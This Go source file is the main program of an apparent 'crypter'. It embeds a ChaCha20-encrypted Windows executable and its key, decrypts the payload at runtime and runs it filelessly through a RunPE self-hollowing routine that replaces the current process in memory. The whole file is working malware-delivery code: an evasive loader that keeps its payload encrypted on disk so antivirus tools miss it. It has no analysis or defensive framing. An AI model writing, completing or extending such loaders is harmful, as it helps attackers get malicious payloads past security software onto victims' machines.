package main

import (
	_ "embed"
	"log"

	"golang.org/x/crypto/chacha20"
	"crypter/internal/runpe"
)

//go:embed encrypted_Input.bin
var encryptedBytes []byte

//go:embed key.txt
var keyData []byte

func main() {
	peBytes, err := decryptFile()
	if err != nil {
		log.Fatalf("Failed to decrypt file: %v", err)
	}
	fileless(peBytes)
}

func decryptFile() ([]byte, error) {
	keyBytes := keyData[:32]
	nonceBytes := keyData[32:44]

	cipher, err := chacha20.NewUnauthenticatedCipher(keyBytes, nonceBytes)
	if err != nil {
		return nil, err
	}

	decryptedBytes := make([]byte, len(encryptedBytes))
	cipher.XORKeyStream(decryptedBytes, encryptedBytes)

	return decryptedBytes, nil
}

func fileless(execBytes []byte) {
	// With self-hollowing, we no longer need a target process path
	// as the current process will be hollowed out and replaced
	log.Println("Starting self-hollowing process...")
	
	err := runpe.ExecuteInMemory(execBytes, "")
	if err != nil {
		log.Fatalf("Self-hollowing execution failed: %v", err)
	}
	
	// If we reach here, something went wrong as the process should have been replaced
	log.Println("Warning: Process continued execution after self-hollowing, this indicates a potential issue")
} 